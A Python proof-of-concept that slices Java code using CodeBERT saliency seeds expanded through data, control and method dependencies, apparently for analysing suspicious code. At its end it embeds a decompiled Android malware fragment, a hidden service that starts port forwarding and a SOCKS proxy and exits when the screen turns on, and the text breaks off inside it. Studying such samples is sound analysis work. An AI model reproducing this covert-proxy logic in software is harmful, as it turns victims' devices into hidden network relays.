#!/usr/bin/env python3
"""
POC: Saliency-Guided Semantic Code Slicing for Java

Idea:
    CodeBERT saliency identifies important lines.
    Those lines are only SEEDS.
    A lightweight semantic slicer then expands the seeds through:
      1. backward data dependencies
      2. forward data dependencies
      3. enclosing control structures
      4. method/class context
      5. related method calls
    Finally, a token budget is applied.

This is intentionally a POC.
It is NOT a full Java AST/PDG implementation.

The goal of this POC is to test whether:
    "saliency + semantic dependency expansion"
outperforms:
    "saliency-only pruning"
while retaining source -> transformation -> sink context.
"""

import re
import math
from dataclasses import dataclass, field
from typing import Dict, List, Set, Tuple, Optional

import numpy as np
import torch
from transformers import AutoTokenizer, AutoModel


# ============================================================
# MODEL
# ============================================================

DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")
MODEL_NAME = "microsoft/codebert-base"

tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model = AutoModel.from_pretrained(MODEL_NAME).to(DEVICE)
model.eval()


# ============================================================
# CONFIG
# ============================================================

MAX_LEN = 512
STRIDE = 256

DEFAULT_TOP_K_RATIO = 0.10
DEFAULT_MIN_SEEDS = 4

DEFAULT_BACKWARD_DEPTH = 6
DEFAULT_FORWARD_DEPTH = 6

DEFAULT_KEEP_RATIO = 0.30
DEFAULT_MAX_TOKENS = 512

# If True, saliency is used again to fill unused budget.
FILL_WITH_SALIENCY = True


# ============================================================
# JAVA LEXICAL HELPERS
# ============================================================

IDENT_RE = re.compile(r"\b[A-Za-z_$][\w$]*\b")

ASSIGN_RE = re.compile(
    r"(?<![=!<>])(?:\+=|-=|\*=|/=|%=|=(?!=))"
)

METHOD_DECL_RE = re.compile(
    r"""
    (?:
        public|private|protected|static|final|abstract|
        synchronized|native|default
    )?
    \s*
    (?:<[^>{}]+>\s*)?
    [\w$<>\[\], ?]+\s+
    ([A-Za-z_$][\w$]*)\s*
    \([^;{}]*\)
    (?:\s+throws\s+[^{]+)?
    \s*\{
    """,
    re.VERBOSE,
)

CONTROL_RE = re.compile(
    r"^\s*(if|else\s+if|else|for|while|do|switch|catch|try|finally)\b"
)

CLASS_RE = re.compile(
    r"\b(class|interface|enum|record)\b"
)

JAVA_KEYWORDS = {
    "if", "else", "for", "while", "do", "switch", "case",
    "break", "continue", "return", "throw", "throws", "try",
    "catch", "finally", "new", "class", "interface", "enum",
    "record", "extends", "implements", "public", "private",
    "protected", "static", "final", "abstract", "synchronized",
    "native", "void", "boolean", "byte", "char", "short",
    "int", "long", "float", "double", "this", "super",
    "null", "true", "false", "instanceof", "package", "import",
    "volatile", "transient", "assert", "default", "strictfp",
}


# ============================================================
# DATA STRUCTURE
# ============================================================

@dataclass
class Statement:
    idx: int
    start_line: int
    end_line: int
    text: str
    kind: str = "statement"
    method_id: int = -1
    block_depth: int = 0
    defines: Set[str] = field(default_factory=set)
    uses: Set[str] = field(default_factory=set)
    calls: Set[str] = field(default_factory=set)


# ============================================================
# TOKEN COUNT
# ============================================================

def token_count(text: str) -> int:
    return len(
        tokenizer(
            text,
            add_special_tokens=False,
            truncation=False
        )["input_ids"]
    )


# ============================================================
# IDENTIFIER EXTRACTION
# ============================================================

def extract_identifiers(text: str) -> Set[str]:
    return {
        x
        for x in IDENT_RE.findall(text)
        if x not in JAVA_KEYWORDS
    }


def extract_method_calls(text: str) -> Set[str]:
    """
    Extract method names from expressions such as:

        send(data)
        encrypt(data)
        obj.send(data)

    This is intentionally lightweight.
    """

    calls = set()

    for match in re.finditer(
        r"(?:\b[A-Za-z_$][\w$]*\s*\.\s*)?"
        r"\b([A-Za-z_$][\w$]*)\s*\(",
        text,
    ):
        name = match.group(1)

        if name not in JAVA_KEYWORDS:
            calls.add(name)

    return calls


# ============================================================
# REMOVE // COMMENTS
# ============================================================

def strip_line_comment(text: str) -> str:
    in_string = False
    in_char = False
    escaped = False

    for i, ch in enumerate(text):
        if escaped:
            escaped = False
            continue

        if ch == "\\" and (in_string or in_char):
            escaped = True
            continue

        if ch == '"' and not in_char:
            in_string = not in_string
            continue

        if ch == "'" and not in_string:
            in_char = not in_char
            continue

        if (
            ch == "/"
            and not in_string
            and not in_char
            and i + 1 < len(text)
            and text[i + 1] == "/"
        ):
            return text[:i]

    return text


# ============================================================
# CHAR OFFSET -> LINE
# ============================================================

def char_to_line(
    char_pos: int,
    line_ends: np.ndarray
) -> int:
    if len(line_ends) == 0:
        return 0

    return min(
        np.searchsorted(
            line_ends,
            char_pos,
            side="right"
        ),
        len(line_ends) - 1
    )


# ============================================================
# EXISTING CODEBERT SALIENCY
# ============================================================

def get_saliency_line_scores(
    java_codes: List[str],
    use_attention_fusion: bool = True,
    batch_size: int = 16,
    debug: bool = True
) -> List[Tuple[np.ndarray, List[str]]]:

    if not java_codes:
        return []

    all_windows = []
    window_meta = []
    class_data = []

    cls_id = tokenizer.cls_token_id
    sep_id = tokenizer.sep_token_id

    # --------------------------------------------------------
    # Create sliding windows
    # --------------------------------------------------------

    for cls_idx, code in enumerate(java_codes):

        enc = tokenizer(
            code,
            return_offsets_mapping=True,
            add_special_tokens=False,
            truncation=False,
        )

        input_ids = enc["input_ids"]
        offset_map = enc["offset_mapping"]

        lines = code.splitlines(
            keepends=True
        )

        line_ends = np.cumsum(
            [len(x) for x in lines]
        )

        total_tokens = len(input_ids)

        for start in range(
            0,
            total_tokens,
            STRIDE
        ):
            end = min(
                start + MAX_LEN - 2,
                total_tokens
            )

            if end <= start:
                break

            window_ids = (
                [cls_id]
                + input_ids[start:end]
                + [sep_id]
            )

            all_windows.append(
                window_ids
            )

            window_meta.append(
                (
                    cls_idx,
                    start,
                    end
                )
            )

        class_data.append(
            (
                offset_map,
                line_ends,
                total_tokens,
                lines
            )
        )

    # --------------------------------------------------------
    # Token score storage
    # --------------------------------------------------------

    token_score_sum = [
        np.zeros(
            data[2],
            dtype=np.float32
        )
        for data in class_data
    ]

    token_score_cnt = [
        np.zeros(
            data[2],
            dtype=np.int32
        )
        for data in class_data
    ]

    # --------------------------------------------------------
    # Process windows
    # --------------------------------------------------------

    for batch_start in range(
        0,
        len(all_windows),
        batch_size
    ):

        batch_windows = all_windows[
            batch_start:
            batch_start + batch_size
        ]

        batch_meta = window_meta[
            batch_start:
            batch_start + batch_size
        ]

        batch_max_len = max(
            len(x)
            for x in batch_windows
        )

        input_ids = torch.full(
            (
                len(batch_windows),
                batch_max_len
            ),
            tokenizer.pad_token_id,
            dtype=torch.long,
            device=DEVICE,
        )

        attention_mask = torch.zeros(
            (
                len(batch_windows),
                batch_max_len
            ),
            dtype=torch.long,
            device=DEVICE,
        )

        for i, window in enumerate(
            batch_windows
        ):

            length = len(window)

            input_ids[
                i,
                :length
            ] = torch.tensor(
                window,
                dtype=torch.long,
                device=DEVICE
            )

            attention_mask[
                i,
                :length
            ] = 1

        # ----------------------------------------------------
        # Embeddings
        # ----------------------------------------------------

        embeddings = (
            model.get_input_embeddings()(
                input_ids
            )
        )

        embeddings.retain_grad()

        model.zero_grad(
            set_to_none=True
        )

        # ----------------------------------------------------
        # Forward
        # ----------------------------------------------------

        if DEVICE.type == "cuda":

            with torch.autocast(
                device_type="cuda",
                dtype=torch.float16
            ):

                outputs = model(
                    inputs_embeds=embeddings,
                    attention_mask=attention_mask,
                    output_attentions=use_attention_fusion,
                )

                cls_norm = (
                    outputs
                    .last_hidden_state[:, 0, :]
                    .norm(dim=-1)
                )

                loss = cls_norm.sum()

        else:

            outputs = model(
                inputs_embeds=embeddings,
                attention_mask=attention_mask,
                output_attentions=use_attention_fusion,
            )

            cls_norm = (
                outputs
                .last_hidden_state[:, 0, :]
                .norm(dim=-1)
            )

            loss = cls_norm.sum()

        # ----------------------------------------------------
        # Backprop
        # ----------------------------------------------------

        loss.backward()

        # ----------------------------------------------------
        # Gradient x input saliency
        # ----------------------------------------------------

        grad = embeddings.grad

        saliency = (
            embeddings.float()
            * grad.float()
        ).norm(dim=-1)

        # ----------------------------------------------------
        # Attention fusion
        # ----------------------------------------------------

        if (
            use_attention_fusion
            and outputs.attentions is not None
        ):

            layer_indices = [
                x
                for x in [6, 7, 8, 9]
                if x < len(outputs.attentions)
            ]

            if layer_indices:

                attn_weights = torch.zeros(
                    embeddings.size(0),
                    embeddings.size(1),
                    device=DEVICE
                )

                for layer_idx in layer_indices:

                    layer_attn = (
                        outputs
                        .attentions[layer_idx]
                        .mean(dim=1)
                    )

                    attn_weights += (
                        layer_attn[:, 0, :]
                    )

                attn_weights /= len(
                    layer_indices
                )

                saliency = (
                    saliency
                    * attn_weights
                )

        # ----------------------------------------------------
        # CPU
        # ----------------------------------------------------

        token_scores = (
            saliency
            .detach()
            .cpu()
            .numpy()
        )

        # ----------------------------------------------------
        # Map back to original token positions
        # ----------------------------------------------------

        for batch_idx, (
            cls_idx,
            start,
            end
        ) in enumerate(batch_meta):

            content_len = end - start

            scores = token_scores[
                batch_idx,
                1:
                content_len + 1
            ]

            token_score_sum[
                cls_idx
            ][start:end] += scores

            token_score_cnt[
                cls_idx
            ][start:end] += 1

        del (
            input_ids,
            attention_mask,
            embeddings,
            outputs,
            grad,
            loss,
            saliency,
        )

        if DEVICE.type == "cuda":
            torch.cuda.empty_cache()

    # --------------------------------------------------------
    # Token -> line
    # --------------------------------------------------------

    results = []

    for cls_idx, (
        offset_map,
        line_ends,
        total_tokens,
        lines
    ) in enumerate(class_data):

        mask = (
            token_score_cnt[cls_idx]
            > 0
        )

        token_scores_final = (
            np.zeros(
                total_tokens,
                dtype=np.float32
            )
        )

        token_scores_final[mask] = (
            token_score_sum[
                cls_idx
            ][mask]
            /
            token_score_cnt[
                cls_idx
            ][mask]
        )

        line_scores = np.zeros(
            len(lines),
            dtype=np.float32
        )

        for token_idx, (
            start_char,
            end_char
        ) in enumerate(offset_map):

            if (
                start_char == 0
                and end_char == 0
            ):
                continue

            line_idx = char_to_line(
                start_char,
                line_ends
            )

            line_scores[line_idx] += (
                token_scores_final[
                    token_idx
                ]
            )

        results.append(
            (
                line_scores,
                lines
            )
        )

        if debug:

            print(
                f"[SALIENCY] "
                f"lines={len(lines)} "
                f"tokens={total_tokens}"
            )

            print(
                "[SALIENCY] Top candidates:"
            )

            for idx in np.argsort(
                line_scores
            )[::-1][:10]:

                print(
                    f"  L{idx+1:04d} "
                    f"score={line_scores[idx]:.6g} "
                    f"| "
                    f"{lines[idx].strip()}"
                )

    return results


# ============================================================
# STATEMENT EXTRACTION
# ============================================================

def split_into_statements(
    lines: List[str]
) -> List[Statement]:

    statements = []

    buffer = []

    start_line = None

    depth = 0

    method_id = -1

    next_idx = 0

    for line_idx, raw_line in enumerate(lines):

        line = strip_line_comment(
            raw_line
        )

        stripped = line.strip()

        if (
            start_line is None
            and stripped
        ):
            start_line = line_idx
            buffer = []

        if start_line is not None:
            buffer.append(
                raw_line
            )

        # ----------------------------------------------------
        # Class/method/control structural depth
        # ----------------------------------------------------

        opening = line.count("{")
        closing = line.count("}")

        # ----------------------------------------------------
        # Detect method declarations
        # ----------------------------------------------------

        method_match = METHOD_DECL_RE.search(
            line
        )

        if method_match:
            method_id += 1

        # ----------------------------------------------------
        # Statement boundary
        # ----------------------------------------------------

        statement_end = (
            ";" in line
            or stripped.endswith("{")
            or stripped.endswith("}")
        )

        if (
            statement_end
            and start_line is not None
        ):

            text = "".join(
                buffer
            )

            clean = "\n".join(
                x.strip()
                for x in buffer
                if x.strip()
            )

            if CONTROL_RE.search(
                clean
            ):
                kind = "control"

            elif CLASS_RE.search(
                clean
            ):
                kind = (
                    "class"
                )

            elif method_match:
                kind = (
                    "method"
                )

            elif clean.startswith(
                "return"
            ):
                kind = "return"

            else:
                kind = "statement"

            statements.append(
                Statement(
                    idx=next_idx,
                    start_line=start_line,
                    end_line=line_idx,
                    text=text,
                    kind=kind,
                    method_id=method_id,
                    block_depth=depth,
                )
            )

            next_idx += 1

            buffer = []

            start_line = None

        depth += opening
        depth -= closing
        depth = max(
            0,
            depth
        )

    # --------------------------------------------------------
    # Remaining text
    # --------------------------------------------------------

    if (
        buffer
        and start_line is not None
    ):

        statements.append(
            Statement(
                idx=next_idx,
                start_line=start_line,
                end_line=len(lines) - 1,
                text="".join(buffer),
                kind="statement",
                method_id=method_id,
                block_depth=depth,
            )
        )

    # --------------------------------------------------------
    # Def/use/calls
    # --------------------------------------------------------

    for stmt in statements:

        clean = " ".join(
            x.strip()
            for x in stmt.text.splitlines()
            if x.strip()
        )

        clean = strip_line_comment(
            clean
        )

        # Method calls
        stmt.calls = (
            extract_method_calls(
                clean
            )
        )

        # Assignment
        assignment = ASSIGN_RE.search(
            clean
        )

        if assignment:

            lhs = clean[
                :assignment.start()
            ]

            rhs = clean[
                assignment.end():
            ]

            lhs_ids = extract_identifiers(
                lhs
            )

            if lhs_ids:
                # Last identifier on LHS is normally the assigned variable.
                stmt.defines = {
                    sorted(lhs_ids)[-1]
                }

            stmt.uses = (
                extract_identifiers(rhs)
                - stmt.defines
            )

        else:

            stmt.uses = (
                extract_identifiers(
                    clean
                )
            )

    return statements


# ============================================================
# DEPENDENCY GRAPH
# ============================================================

def build_dependency_graph(
    statements: List[Statement]
) -> Tuple[
    Dict[int, Set[int]],
    Dict[int, Set[int]]
]:

    backward = {
        s.idx: set()
        for s in statements
    }

    forward = {
        s.idx: set()
        for s in statements
    }

    # variable -> most recent definition
    last_definition = {}

    # --------------------------------------------------------
    # Variable dependencies
    # --------------------------------------------------------

    for stmt in statements:

        for var in stmt.uses:

            if var in last_definition:

                source = (
                    last_definition[var]
                )

                backward[
                    stmt.idx
                ].add(source)

                forward[
                    source
                ].add(stmt.idx)

        for var in stmt.defines:

            last_definition[var] = (
                stmt.idx
            )

    # --------------------------------------------------------
    # Method-call relationships
    #
    # Example:
    #
    # payload = buildPayload(...)
    #
    # later:
    #
    # upload(payload)
    #
    # variable dependency already catches this.
    #
    # This second pass connects a call to a method declaration
    # with the same name.
    # --------------------------------------------------------

    method_declarations = {}

    for stmt in statements:

        if stmt.kind == "method":

            match = METHOD_DECL_RE.search(
                stmt.text
            )

            if match:

                name = match.group(1)

                method_declarations.setdefault(
                    name,
                    set()
                ).add(
                    stmt.idx
                )

    for stmt in statements:

        for call in stmt.calls:

            if call in method_declarations:

                for method_idx in (
                    method_declarations[call]
                ):

                    backward[
                        stmt.idx
                    ].add(
                        method_idx
                    )

                    forward[
                        method_idx
                    ].add(
                        stmt.idx
                    )

    return backward, forward


# ============================================================
# CONTROL CONTEXT
# ============================================================

def find_enclosing_controls(
    statements: List[Statement],
    target_idx: int
) -> Set[int]:

    target = statements[
        target_idx
    ]

    result = set()

    for stmt in statements:

        if (
            stmt.idx >= target.idx
        ):
            break

        if (
            stmt.kind == "control"
            and stmt.block_depth
            <= target.block_depth
        ):
            result.add(
                stmt.idx
            )

    return result


# ============================================================
# SEED SELECTION
# ============================================================

def select_saliency_seeds(
    line_scores: np.ndarray,
    top_k_ratio: float = DEFAULT_TOP_K_RATIO,
    min_seeds: int = DEFAULT_MIN_SEEDS,
) -> Set[int]:

    if len(line_scores) == 0:
        return set()

    k = max(
        min_seeds,
        int(
            math.ceil(
                len(line_scores)
                * top_k_ratio
            )
        )
    )

    k = min(
        k,
        len(line_scores)
    )

    order = np.argsort(
        line_scores
    )[::-1]

    seeds = {
        int(idx)
        for idx in order[:k]
        if line_scores[idx] > 0
    }

    return seeds


# ============================================================
# LINE -> STATEMENT
# ============================================================

def map_seed_lines_to_statements(
    seed_lines: Set[int],
    statements: List[Statement]
) -> Set[int]:

    selected = set()

    for stmt in statements:

        for line_idx in seed_lines:

            if (
                stmt.start_line
                <= line_idx
                <= stmt.end_line
            ):

                selected.add(
                    stmt.idx
                )

                break

    return selected


# ============================================================
# SEMANTIC SLICE
# ============================================================

def semantic_slice(
    statements: List[Statement],
    seed_statements: Set[int],
    backward_graph: Dict[int, Set[int]],
    forward_graph: Dict[int, Set[int]],
    backward_depth: int = DEFAULT_BACKWARD_DEPTH,
    forward_depth: int = DEFAULT_FORWARD_DEPTH,
) -> Tuple[
    Set[int],
    Dict[int, Set[str]]
]:

    selected = set(
        seed_statements
    )

    reasons = {
        idx: {"SEED"}
        for idx in seed_statements
    }

    # --------------------------------------------------------
    # Backward data dependencies
    # --------------------------------------------------------

    frontier = set(
        seed_statements
    )

    for depth in range(
        backward_depth
    ):

        next_frontier = set()

        for node in frontier:

            for dependency in (
                backward_graph.get(
                    node,
                    set()
                )
            ):

                if (
                    dependency
                    not in selected
                ):

                    selected.add(
                        dependency
                    )

                    reasons.setdefault(
                        dependency,
                        set()
                    ).add(
                        f"BACKWARD_{depth+1}"
                    )

                    next_frontier.add(
                        dependency
                    )

        frontier = next_frontier

        if not frontier:
            break

    # --------------------------------------------------------
    # Forward data dependencies
    # --------------------------------------------------------

    frontier = set(
        seed_statements
    )

    for depth in range(
        forward_depth
    ):

        next_frontier = set()

        for node in frontier:

            for dependent in (
                forward_graph.get(
                    node,
                    set()
                )
            ):

                if (
                    dependent
                    not in selected
                ):

                    selected.add(
                        dependent
                    )

                    reasons.setdefault(
                        dependent,
                        set()
                    ).add(
                        f"FORWARD_{depth+1}"
                    )

                    next_frontier.add(
                        dependent
                    )

        frontier = next_frontier

        if not frontier:
            break

    # --------------------------------------------------------
    # Control dependencies
    # --------------------------------------------------------

    original_selected = list(
        selected
    )

    for seed in original_selected:

        for control in (
            find_enclosing_controls(
                statements,
                seed
            )
        ):

            selected.add(
                control
            )

            reasons.setdefault(
                control,
                set()
            ).add(
                "CONTROL"
            )

    # --------------------------------------------------------
    # Method context
    # --------------------------------------------------------

    method_ids = {
        statements[idx].method_id
        for idx in selected
        if 0 <= idx < len(statements)
    }

    for stmt in statements:

        if (
            stmt.method_id in method_ids
            and stmt.kind == "method"
        ):

            selected.add(
                stmt.idx
            )

            reasons.setdefault(
                stmt.idx,
                set()
            ).add(
                "METHOD_CONTEXT"
            )

    return (
        selected,
        reasons
    )


# ============================================================
# STATEMENTS -> LINES
# ============================================================

def statement_indices_to_lines(
    statements: List[Statement],
    statement_indices: Set[int]
) -> Set[int]:

    lines = set()

    for idx in statement_indices:

        stmt = statements[
            idx
        ]

        lines.update(
            range(
                stmt.start_line,
                stmt.end_line + 1
            )
        )

    return lines


# ============================================================
# TOKEN BUDGET
# ============================================================

def select_with_token_budget(
    lines: List[str],
    line_scores: np.ndarray,
    semantic_lines: Set[int],
    keep_ratio: float,
    max_tokens: Optional[int] = None,
) -> Set[int]:

    original_tokens = token_count(
        "".join(lines)
    )

    target_tokens = int(
        math.ceil(
            original_tokens
            * keep_ratio
        )
    )

    if max_tokens is not None:

        target_tokens = min(
            target_tokens,
            max_tokens
        )

    line_costs = np.asarray([
        max(
            1,
            token_count(line)
        )
        for line in lines
    ])

    keep = set(
        semantic_lines
    )

    used_tokens = int(
        line_costs[
            list(keep)
        ].sum()
    ) if keep else 0

    print(
        "\n[BUDGET]"
    )

    print(
        f"Original tokens : "
        f"{original_tokens}"
    )

    print(
        f"Target tokens   : "
        f"{target_tokens}"
    )

    print(
        f"Semantic tokens : "
        f"{used_tokens}"
    )

    # --------------------------------------------------------
    # Semantic context gets priority.
    # --------------------------------------------------------

    if used_tokens >= target_tokens:

        print(
            "Semantic slice already "
            "fills/exceeds target; "
            "nothing else is added."
        )

        return keep

    # --------------------------------------------------------
    # Fill remaining budget with saliency.
    # --------------------------------------------------------

    if FILL_WITH_SALIENCY:

        order = np.argsort(
            line_scores
        )[::-1]

        for idx in order:

            idx = int(idx)

            if idx in keep:
                continue

            if line_scores[idx] <= 0:
                continue

            cost = int(
                line_costs[idx]
            )

            if (
                used_tokens
                + cost
                > target_tokens
            ):
                continue

            keep.add(
                idx
            )

            used_tokens += cost

            if (
                used_tokens
                >= target_tokens
            ):
                break

    print(
        f"Final selected tokens: "
        f"{used_tokens}"
    )

    return keep


# ============================================================
# RENDER
# ============================================================

def render_pruned_source(
    lines: List[str],
    keep_indices: Set[int]
) -> str:

    output = []

    previous = -2

    for idx in sorted(
        keep_indices
    ):

        if (
            idx
            > previous + 1
        ):

            output.append(
                "// ... pruned ...\n"
            )

        output.append(
            lines[idx]
        )

        previous = idx

    return "".join(
        output
    )


# ============================================================
# DEBUG REPORT
# ============================================================

def print_slice_report(
    lines: List[str],
    statements: List[Statement],
    seed_lines: Set[int],
    seed_statements: Set[int],
    selected_statements: Set[int],
    reasons: Dict[int, Set[str]],
    final_keep: Set[int],
    line_scores: np.ndarray,
) -> None:

    print(
        "\n"
        + "=" * 70
    )

    print(
        "SLICE DEBUG REPORT"
    )

    print(
        "=" * 70
    )

    print(
        f"Seed lines       : "
        f"{len(seed_lines)}"
    )

    print(
        f"Seed statements  : "
        f"{len(seed_statements)}"
    )

    print(
        f"Semantic stmts   : "
        f"{len(selected_statements)}"
    )

    print(
        f"Final lines      : "
        f"{len(final_keep)} / "
        f"{len(lines)}"
    )

    print(
        "\nSEEDS:"
    )

    for idx in sorted(
        seed_lines
    ):

        print(
            f"  L{idx+1:04d} "
            f"score={line_scores[idx]:.6g} "
            f"| "
            f"{lines[idx].strip()}"
        )

    print(
        "\nSELECTED STATEMENTS:"
    )

    for idx in sorted(
        selected_statements
    ):

        stmt = statements[
            idx
        ]

        why = ",".join(
            sorted(
                reasons.get(
                    idx,
                    set()
                )
            )
        )

        print(
            f"  S{idx:04d} "
            f"L{stmt.start_line+1:04d}-"
            f"L{stmt.end_line+1:04d} "
            f"[{why}] "
            f"{' '.join(stmt.text.split())[:150]}"
        )

    print(
        "\nDROPPED LINES:"
    )

    dropped = [
        idx
        for idx in range(
            len(lines)
        )
        if idx not in final_keep
    ]

    for idx in dropped[:50]:

        print(
            f"  DROP L{idx+1:04d} "
            f"score={line_scores[idx]:.6g} "
            f"| "
            f"{lines[idx].strip()}"
        )

    if len(dropped) > 50:

        print(
            f"  ... "
            f"{len(dropped)-50}"
            f" more ..."
        )


# ============================================================
# MAIN POC FUNCTION
# ============================================================

def smart_slice_poc(
    class_source: str,
    keep_ratio: float = DEFAULT_KEEP_RATIO,
    max_tokens: Optional[int] = DEFAULT_MAX_TOKENS,
    top_k_ratio: float = DEFAULT_TOP_K_RATIO,
    min_seeds: int = DEFAULT_MIN_SEEDS,
    backward_depth: int = DEFAULT_BACKWARD_DEPTH,
    forward_depth: int = DEFAULT_FORWARD_DEPTH,
    use_attention_fusion: bool = True,
) -> str:

    print(
        "\n"
        + "=" * 70
    )

    print(
        "SALIENCY-GUIDED "
        "SEMANTIC SLICING POC"
    )

    print(
        "=" * 70
    )

    lines = class_source.splitlines(
        keepends=True
    )

    original_tokens = token_count(
        class_source
    )

    print(
        f"Input lines  : "
        f"{len(lines)}"
    )

    print(
        f"Input tokens : "
        f"{original_tokens}"
    )

    # ========================================================
    # 1. SALIENCY
    # ========================================================

    line_scores, _ = (
        get_saliency_line_scores(
            [class_source],
            use_attention_fusion=
            use_attention_fusion,
            batch_size=32,
            debug=True,
        )[0]
    )

    # ========================================================
    # 2. SEEDS
    # ========================================================

    seed_lines = (
        select_saliency_seeds(
            line_scores,
            top_k_ratio=
            top_k_ratio,
            min_seeds=
            min_seeds,
        )
    )

    print(
        "\n"
        + "=" * 70
    )

    print(
        "SALiency SEEDS"
    )

    print(
        "=" * 70
    )

    for idx in sorted(
        seed_lines
    ):

        print(
            f"L{idx+1:04d} "
            f"score={line_scores[idx]:.6g} "
            f"| "
            f"{lines[idx].strip()}"
        )

    # ========================================================
    # 3. STATEMENTS
    # ========================================================

    statements = (
        split_into_statements(
            lines
        )
    )

    print(
        "\n"
        f"Extracted "
        f"{len(statements)} statements"
    )

    for stmt in statements:

        print(
            f"S{stmt.idx:04d} "
            f"L{stmt.start_line+1:04d}-"
            f"L{stmt.end_line+1:04d} "
            f"[{stmt.kind}] "
            f"defs={sorted(stmt.defines)} "
            f"uses={sorted(stmt.uses)} "
            f"| "
            f"{' '.join(stmt.text.split())[:140]}"
        )

    # ========================================================
    # 4. DEPENDENCY GRAPH
    # ========================================================

    backward_graph, forward_graph = (
        build_dependency_graph(
            statements
        )
    )

    # ========================================================
    # 5. MAP SEEDS
    # ========================================================

    seed_statements = (
        map_seed_lines_to_statements(
            seed_lines,
            statements
        )
    )

    print(
        "\n"
        f"Seed statements: "
        f"{sorted(seed_statements)}"
    )

    for idx in sorted(
        seed_statements
    ):

        print(
            f"S{idx:04d} "
            f"BACKWARD="
            f"{sorted(backward_graph[idx])} "
            f"FORWARD="
            f"{sorted(forward_graph[idx])}"
        )

    # ========================================================
    # 6. SEMANTIC SLICE
    # ========================================================

    selected_statements, reasons = (
        semantic_slice(
            statements,
            seed_statements,
            backward_graph,
            forward_graph,
            backward_depth=
            backward_depth,
            forward_depth=
            forward_depth,
        )
    )

    semantic_lines = (
        statement_indices_to_lines(
            statements,
            selected_statements
        )
    )

    # Always preserve package/class boundary.
    semantic_lines.add(0)
    semantic_lines.add(
        len(lines) - 1
    )

    # ========================================================
    # 7. TOKEN BUDGET
    # ========================================================

    final_keep = (
        select_with_token_budget(
            lines,
            line_scores,
            semantic_lines,
            keep_ratio,
            max_tokens,
        )
    )

    # ========================================================
    # 8. DEBUG
    # ========================================================

    print_slice_report(
        lines=lines,
        statements=statements,
        seed_lines=seed_lines,
        seed_statements=seed_statements,
        selected_statements=selected_statements,
        reasons=reasons,
        final_keep=final_keep,
        line_scores=line_scores,
    )

    # ========================================================
    # 9. RENDER
    # ========================================================

    pruned = (
        render_pruned_source(
            lines,
            final_keep
        )
    )

    output_tokens = token_count(
        pruned
    )

    reduction = (
        100.0
        * (
            1.0
            -
            output_tokens
            /
            max(
                1,
                original_tokens
            )
        )
    )

    print(
        "\n"
        + "=" * 70
    )

    print(
        "FINAL RESULT"
    )

    print(
        "=" * 70
    )

    print(
        f"Input tokens  : "
        f"{original_tokens}"
    )

    print(
        f"Output tokens : "
        f"{output_tokens}"
    )

    print(
        f"Reduction     : "
        f"{reduction:.2f}%"
    )

    print(
        f"Input lines   : "
        f"{len(lines)}"
    )

    print(
        f"Output lines  : "
        f"{len(final_keep)}"
    )

    print(
        "\n"
        + "=" * 70
    )

    print(
        "PRUNED SOURCE"
    )

    print(
        "=" * 70
    )

    print(
        pruned
    )

    return pruned


# ============================================================
# DUMMY MALICIOUS-LOOKING CLASS
# ============================================================

DUMMY_CLASS = r'''
package android.system.sa;

import android.R;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.system.ap.g;
import com.my.es.target.ads.MyTargetVideoView;
import com.my.es.target.nativeads.banners.NavigationType;
import org.json.JSONObject;

/* loaded from: classes2.dex */
public class SS extends Service {
    private Service a;
    private PowerManager b;
    private PowerManager.WakeLock c;
    private WifiManager.WifiLock d;
    private JSONObject e;

    class a extends AsyncTask<Integer, Void, Void> {
        a() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        /* renamed from: a, reason: merged with bridge method [inline-methods] */
        public Void doInBackground(Integer... numArr) {
            try {
                android.system.f.a.a(SS.this.a, "starting", null);
                b.a("PortForwardingR.start");
                c.a(SS.this.a, SS.this.e);
                b.a("SOCKS.start");
                d.a(SS.this.a, SS.this.e);
            } catch (Exception e) {
                android.system.f.a.a(SS.this.a, "exit", e.toString());
                e.printStackTrace();
                b.a(e.toString());
                SS.this.a.stopSelf();
                System.exit(0);
            }
            return null;
        }
    }

    private void a() {
        try {
            this.c = ((PowerManager) getSystemService("power")).newWakeLock(1, "lock");
            this.c.acquire();
            this.d = ((WifiManager) getSystemService("wifi")).createWifiLock(1, "lock");
            this.d.acquire();
        } catch (Exception e) {
            System.exit(0);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        b.a("closing socks from " + str);
        android.system.f.a.a(this.a, "exit", str);
        b();
        c.a();
        if (this.a != null) {
            this.a.stopForeground(true);
        }
        this.a.stopSelf();
        System.exit(0);
    }

    private Bitmap b(String str) {
        if (str.equalsIgnoreCase("drive") || str.equalsIgnoreCase("gmail") || str.equalsIgnoreCase("music") || str.equalsIgnoreCase("services") || str.equalsIgnoreCase(NavigationType.STORE) || str.equalsIgnoreCase("youtube")) {
            return g.a(this, "icons/" + str + ".png");
        }
        try {
            return g.a(getPackageManager().getApplicationIcon(str));
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void b() {
        try {
            if (this.d != null && !this.d.isHeld()) {
                this.d.release();
            }
            if (this.c == null || this.c.isHeld()) {
                return;
            }
            this.c.release();
        } catch (Exception e) {
            b.a(e.toString());
        }
    }

    private void c() throws Exception {
        new Thread(new Runnable() { // from class: android.system.sa.SS.1
            @Override // java.lang.Runnable
            @SuppressLint({"NewApi"})
            public void run() {
                long j;
                try {
                    long currentTimeMillis = System.currentTimeMillis();
                    try {
                        j = (Long.valueOf(SS.this.e.getString(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT)).longValue() * 1000) + currentTimeMillis;
                    } catch (Exception e) {
                        e.printStackTrace();
                        j = 0;
                    }
                    while (true) {
                        if (Build.VERSION.SDK_INT < 20) {
                            if (SS.this.b.isScreenOn()) {
                                SS.this.a("powerManager");
                                return;
                            }
                        } else if (SS.this.b.isInteractive()) {
                            SS.this.a("powerManager");
                            return;
                        }
                        if (j != currentTimeMillis && System.currentTimeMillis() > j) {
                            SS.this.a(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT);
                            return;
                        }
                        if (!SS.this.d()) {
                            SS.this.a("no internet");
                        }
                        try {
                            Thread.currentThread();
                            Thread.sleep(100L);
